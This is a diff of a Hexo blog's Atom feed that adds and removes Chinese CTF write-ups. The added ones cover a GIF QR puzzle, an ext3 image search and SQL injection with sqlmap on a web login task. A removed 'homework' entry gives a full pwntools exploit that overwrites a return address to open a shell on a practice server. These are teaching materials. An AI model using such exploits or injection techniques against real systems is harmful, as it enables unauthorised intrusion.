@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-11-18T10:45:31.706Z</updated>
+  <updated>2019-11-18T12:35:35.484Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,75 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>giveyouflag</title>
+    <link href="http://yoursite.com/2019/11/18/giveyouflag/"/>
+    <id>http://yoursite.com/2019/11/18/giveyouflag/</id>
+    <published>2019-11-18T12:14:46.000Z</published>
+    <updated>2019-11-18T12:35:35.484Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="src-攻防世界-give-you-flag"><a href="#src-攻防世界-give-you-flag" class="headerlink" title="[src = 攻防世界] give_you_flag"></a>[src = 攻防世界] give_you_flag</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开图片，发现似乎有个二维码。通过工具（gif分离器）将各帧分离。得到52张图片，其中第49张包含一个二维码，但是缺少了3个定位符。手动添加，扫码即可。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;src-攻防世界-give-you-flag&quot;&gt;&lt;a href=&quot;#src-攻防世界-give-you-flag&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] give_you_flag&quot;&gt;&lt;/a&gt;[src = 攻防世界] give_you_flag&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
+    
+    
+      <category term="信息隐藏" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ext3</title>
+    <link href="http://yoursite.com/2019/11/18/ext3/"/>
+    <id>http://yoursite.com/2019/11/18/ext3/</id>
+    <published>2019-11-18T12:06:28.000Z</published>
+    <updated>2019-11-18T12:15:56.448Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="src-攻防世界-ext3"><a href="#src-攻防世界-ext3" class="headerlink" title="[src = 攻防世界] ext3"></a>[src = 攻防世界] ext3</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>今天是菜狗的生日，他收到了一个linux系统光盘<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>将下载附件放到linux系统查看file格式，如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># file 630a886233764ec2a63f305f318c8baa </span></span><br><span class="line">630a886233764ec2a63f305f318c8baa: Linux rev 1.0 ext3 filesystem data, UUID=cf6d7bff-c377-403f-84ae-956ce3c99aaa</span><br></pre></td></tr></table></figure><p>再strings查看一下有没有flag这样的字符串：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># strings 630a886233764ec2a63f305f318c8baa |grep flag</span></span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">~root/Desktop/file/O7avZhikgKgbF/flag.txt</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br></pre></td></tr></table></figure><p>flag应该在flag.txt中。</p><p>挂载光盘：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># mount 630a886233764ec2a63f305f318c8baa /mnt</span></span><br><span class="line">root@kali:~/Downloads<span class="comment"># cd /mnt</span></span><br><span class="line">root@kali:/mnt<span class="comment"># ls</span></span><br><span class="line">02CdWGSxGPX.bin  0Xs    4A           8HhWfV9nK1  gtj        i             KxEQM           LvuGM       n              OOoOs      Q          rhZE1LZ6g   SPaK8l2sYN</span><br><span class="line">0GY1l            1      6JR3         8nwg        h          imgLDPt4BY    LG6F            lWIRfzP     NgzQPW         orcA       qkCN8      Ruc9        SrZznhSAj</span><br><span class="line">0h3a5            2X     6wUaZE1vbsW  8RxQG4bvd   H          ix1EMRHRpIc2  Lh              m           Nv             oSx2p      QmUY1d     RZTOGd      t</span><br><span class="line">0l               3      7H7geLlS5    FinD        H2Zj8FNbu  j6uLMX        LlC6Z0zrgy.bin  m9V0lIaElz  o              OT         QQY3sF63w  scripts     T</span><br><span class="line">0qsd             3J     8A2MFawD4    fm          hdi7       jE            LO0J8           MiU         O7avZhikgKgbF  poiuy7Xdb  r          sdb.cramfs  TFGVOSwYd.txt</span><br><span class="line">0wDq5            44aAm  8DQFirm0D    g           hYuPvID    jj            lost+found      Mnuc        o8             px6u       Raf3SYj    sn</span><br><span class="line">root@kali:/mnt<span class="comment"># cd O7avZhikgKgbF/</span></span><br><span class="line">root@kali:/mnt/O7avZhikgKgbF<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@kali:/mnt/O7avZhikgKgbF<span class="comment"># cat flag.txt</span></span><br><span class="line">ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</span><br></pre></td></tr></table></figure><p>一串base64，解码即可得到flag。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;src-攻防世界-ext3&quot;&gt;&lt;a href=&quot;#src-攻防世界-ext3&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] ext3&quot;&gt;&lt;/a&gt;[src = 攻防世界] ext3&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;今天是菜狗的生日，他收到了一个linux系统光盘&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
+    
+    
+      <category term="ext3" scheme="http://yoursite.com/tags/ext3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ics04</title>
+    <link href="http://yoursite.com/2019/11/18/ics04/"/>
+    <id>http://yoursite.com/2019/11/18/ics04/</id>
+    <published>2019-11-18T11:21:08.000Z</published>
+    <updated>2019-11-18T12:06:11.801Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="src-攻防世界-ics-04"><a href="#src-攻防世界-ics-04" class="headerlink" title="[src = 攻防世界] ics-04"></a>[src = 攻防世界] ics-04</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>题目提示登录和注册页面存在漏洞，随便注册一个账号登录，提示“普通用户登录成功,没什么用”。那就看看存不存在SQL注入吧。</p><p>对注册页面和登录页面使用sqlmap进行测试，对于POST方法对测试可以按照如下方法进行，首先使用burp抓包，然后使用“copy to file”功能将请求保存，然后sqlmap -r 文件名即可。比如保存对文件为sq.txt，则使用的sqlmap命令为sqlmap -r sq.txt.</p><p>或者对于POST数据使用–data参数，比如POST数据为username=bitsec，则可以使用如下sqlmap命令：<br>sqlmap -u “***” –data=”username=bitsec”.</p><p>测试所有页面，发现找回密码处有注入,并得到user表里面对数据为：</p><p><img src="./ics041.PNG" alt="isc04"><br>但是无法爆破出来密码。</p><p>但是我们发现注册页面可以重新注册用户，且没有任何验证。所以我们重新注册该用户c3tlwDmIn23，并登录得到flag。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;src-攻防世界-ics-04&quot;&gt;&lt;a href=&quot;#src-攻防世界-ics-04&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] ics-04&quot;&gt;&lt;/a&gt;[src = 攻防世界] ics-04&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
+    
+    
+      <category term="SQL注入，逻辑错误" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5%EF%BC%8C%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF/"/>
+    
+  </entry>
   
   <entry>
     <title>http-header</title>
@@ -440,87 +509,6 @@
       <category term="IDA" scheme="http://yoursite.com/tags/IDA/"/>
     
       <category term="RE" scheme="http://yoursite.com/tags/RE/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>homework</title>
-    <link href="http://yoursite.com/2019/10/10/homework/"/>
-    <id>http://yoursite.com/2019/10/10/homework/</id>
-    <published>2019-10-10T05:15:42.000Z</published>
-    <updated>2019-10-10T09:00:02.909Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="src-hackme-homework"><a href="#src-hackme-homework" class="headerlink" title="[src = hackme] homework"></a>[src = hackme] homework</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7701</span><br></pre></td></tr></table></figure><p>Source Code, Index out bound, Return Address</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目提示查看源代码，并且注意索引越界（Index out bound），返回地址。<br>查看源代码，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run_program</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">10</span>], i, v, act;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        arr[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        ......省略</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;act);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(act) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Index to edit: "</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;i);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"How many? "</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v);</span><br><span class="line">                arr[i] = v;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">         ......省略</span><br></pre></td></tr></table></figure><p>发现run_program()中定义了一个数组arr[10], 下面可以通过输入设置其值。但是在case1中赋值时没有检查index的值，导致可以输入任意的索引值，即导致任意地址读写。</p><p>而且在题目的源码中还给出了一个打开shell的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">call_me_maybe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此只要通过选择合适的Index的值，使得arr[Index]的位置巧合是run_program()函数的返回地址，并且将其值设置为call_me_maybe()的地址，则在run_program()返回时，将调用call_me_maybe()打开shell。<br>然后按照PWN的基本思路，在shell中通过cat flag获取flag即可。</p><p>这需要解决两个问题：</p><ol><li>call_me_maybe()的地址；</li><li>run_program()函数返回时返回地址与数组arr[10]的index的关系。</li></ol><p>第一个问题很容易解决，直接IDA打开homework的二进制程序，就可以看到，如图：<br><img src="./homework1.PNG" alt="homework"><br>可以看到call_me_maybe()的地址为0x080485FB。</p><p>第二个问题：获取run_program()函数返回时返回地址与数组arr[10]的index的关系可以通过运行可执行文件，并使用gdb进行调试得到。为了提高调试效率，建议安装gdb的插件pwndbg，具体安装方法可以查阅相关资料，不再赘述。</p><p>首先根据IDA找到case1，在jmp指令（0x080487AF）的位置下断点，来确定index与返回地址位置的关系：</p><p><img src="./homework2.PNG" alt="homework"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/homework$ gdb -q ./homework</span><br><span class="line">pwndbg: loaded 173 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ./homework...done.</span><br><span class="line">pwndbg&gt; b *0x080487AF</span><br><span class="line">Breakpoint 1 at 0x80487af: file pwn-easy.c, line 59.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/bitsec/hackme/homework/homework </span><br><span class="line">What<span class="string">'s your name? bitsec</span></span><br><span class="line"><span class="string">0 &gt; exit</span></span><br><span class="line"><span class="string">1 &gt; edit number</span></span><br><span class="line"><span class="string">2 &gt; show number</span></span><br><span class="line"><span class="string">3 &gt; sum</span></span><br><span class="line"><span class="string">4 &gt; dump all numbers</span></span><br><span class="line"><span class="string"> &gt; 1</span></span><br><span class="line"><span class="string">Index to edit: 1</span></span><br><span class="line"><span class="string">How many? 1</span></span><br></pre></td></tr></table></figure><p>此时栈状态如图：</p><p><img src="./homework3.PNG" alt="homework"></p><p>可以看出arr[0]的相对地址为0014，返回地址（标识ebp下面的地址）为004c，差为0x38/4=0xe=14.即arr[14]的位置为返回地址的位置，所以只要将arr[14]赋值为0x080485FB（call_me_maybe()的入口地址，对应的10进制为134514171）就可以打开shell。</p><p>其实熟悉栈帧排布的话，直接从IDA–&gt;F5，得到的run_program的源码也能分析出来。如图：</p><p><img src="./homework4.PNG" alt="homework"></p><p>可以看到arr在举例ebp为34h的位置，而ebp下紧挨着就是放回地址，即在ebp+4的位置。所以差为34h+4h=38h，得到同样的结果。</p><p>不要忘记，填充完毕之后，还要输入一个0，执行exit，才能从run_program返回，得到shell。</p><p>具体过程如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/homework$ nc hackme.inndy.tw 7701</span><br><span class="line">What<span class="string">'s your name? bitsec</span></span><br><span class="line"><span class="string">0 &gt; exit</span></span><br><span class="line"><span class="string">1 &gt; edit number</span></span><br><span class="line"><span class="string">2 &gt; show number</span></span><br><span class="line"><span class="string">3 &gt; sum</span></span><br><span class="line"><span class="string">4 &gt; dump all numbers</span></span><br><span class="line"><span class="string"> &gt; 1</span></span><br><span class="line"><span class="string">Index to edit: 14</span></span><br><span class="line"><span class="string">How many? 134514171</span></span><br><span class="line"><span class="string">0 &gt; exit</span></span><br><span class="line"><span class="string">1 &gt; edit number</span></span><br><span class="line"><span class="string">2 &gt; show number</span></span><br><span class="line"><span class="string">3 &gt; sum</span></span><br><span class="line"><span class="string">4 &gt; dump all numbers</span></span><br><span class="line"><span class="string"> &gt; 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat flag</span></span><br><span class="line"><span class="string">FLAG&#123;Yoooo, Index Over Flow in my home work......OeAbaFeGeLaF9dEQ&#125;</span></span><br></pre></td></tr></table></figure><p>其实很多情况下通过使用python的pwntool包写pwn的exp程序更有效，上面的过程可以通过下面的代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process("./homework")    #local debug</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"hackme.inndy.tw"</span>, <span class="number">7701</span>)  <span class="comment">#remote debug</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Input Name</span></span><br><span class="line">io.recvuntil(<span class="string">"name? "</span>)</span><br><span class="line">io.sendline(<span class="string">"Any String"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite return address</span></span><br><span class="line">io.recvuntil(<span class="string">"dump all numbers"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" &gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"edit: "</span>)</span><br><span class="line">io.sendline(<span class="string">"14"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many? "</span>)</span><br><span class="line">system_addr = <span class="number">0x080485FB</span></span><br><span class="line">io.sendline(str(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line">io.recvuntil(<span class="string">"dump all numbers"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" &gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/homework$ python homework_exp.py </span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7701: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">homework</span><br><span class="line">run.sh</span><br><span class="line">$ cat flag</span><br><span class="line">FLAG&#123;Yoooo, Index Over Flow <span class="keyword">in</span> my home work......OeAbaFeGeLaF9dEQ&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;src-hackme-homework&quot;&gt;&lt;a href=&quot;#src-hackme-homework&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] homework&quot;&gt;&lt;/a&gt;[src = hackme] homework&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc hackme.inndy.tw 7701&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;p&gt;Source Code, Index out bound, Return Address&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="PWN" scheme="http://yoursite.com/categories/PWN/"/>
-    
-    
-      <category term="nc" scheme="http://yoursite.com/tags/nc/"/>
-    
-      <category term="cat" scheme="http://yoursite.com/tags/cat/"/>
-    
-      <category term="python" scheme="http://yoursite.com/tags/python/"/>
-    
-      <category term="stack overflow" scheme="http://yoursite.com/tags/stack-overflow/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>catflag</title>
-    <link href="http://yoursite.com/2019/10/10/catflag/"/>
-    <id>http://yoursite.com/2019/10/10/catflag/</id>
-    <published>2019-10-10T02:40:14.000Z</published>
-    <updated>2019-10-10T02:46:35.126Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="src-hackme-catflag"><a href="#src-hackme-catflag" class="headerlink" title="[src = hackme] catflag"></a>[src = hackme] catflag</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7709</span><br></pre></td></tr></table></figure><p>Try using nc connect to server!</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目已经说得很清楚，直接nc链接然后cat flag即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~$ nc hackme.inndy.tw 7709</span><br><span class="line">plz capture the flag after 5 seconds...</span><br><span class="line">plz capture the flag after 4 seconds...</span><br><span class="line">plz capture the flag after 3 seconds...</span><br><span class="line">plz capture the flag after 2 seconds...</span><br><span class="line">plz capture the flag after 1 seconds...</span><br><span class="line">cat flag</span><br><span class="line">FLAG&#123;cat flag? dog flag!&#125;</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;src-hackme-catflag&quot;&gt;&lt;a href=&quot;#src-hackme-catflag&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] catflag&quot;&gt;&lt;/a&gt;[src = hackme] catflag&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc hackme.inndy.tw 7709&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;p&gt;Try using nc connect to server!&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="PWN" scheme="http://yoursite.com/categories/PWN/"/>
-    
-    
-      <category term="nc" scheme="http://yoursite.com/tags/nc/"/>
-    
-      <category term="cat" scheme="http://yoursite.com/tags/cat/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>scoreboard</title>
-    <link href="http://yoursite.com/2019/10/10/scoreboard/"/>
-    <id>http://yoursite.com/2019/10/10/scoreboard/</id>
-    <published>2019-10-10T01:25:41.000Z</published>
-    <updated>2019-10-10T01:30:10.890Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="src-hackme-scoreboard"><a href="#src-hackme-scoreboard" class="headerlink" title="[src = hackme] scoreboard"></a>[src = hackme] scoreboard</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>DO NOT ATTACK or SCAN scoreboard, you don’t need to do that.</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>提示不用抓包，前面已经看过网页源代码和其中的js文件，在本页面还有flag的话考虑是否在HTTP的header里面，因此直接火狐浏览器–&gt;F12. 刷新<a href="https://hackme.inndy.tw/scoreboard/" target="_blank" rel="noopener">https://hackme.inndy.tw/scoreboard/</a>页面，在响应头发现flag：</p><p><img src="./scoreboard.PNG" alt="scoreboard"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对HTTP协议的理解，掌握查看HTTP请求头和响应头的方法。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;src-hackme-scoreboard&quot;&gt;&lt;a href=&quot;#src-hackme-scoreboard&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] scoreboard&quot;&gt;&lt;/a&gt;[src = hackme] scoreboard&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;DO NOT ATTACK or SCAN scoreboard, you don’t need to do that.&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
-    
-    
-      <category term="HTTP" scheme="http://yoursite.com/tags/HTTP/"/>
     
   </entry>
   
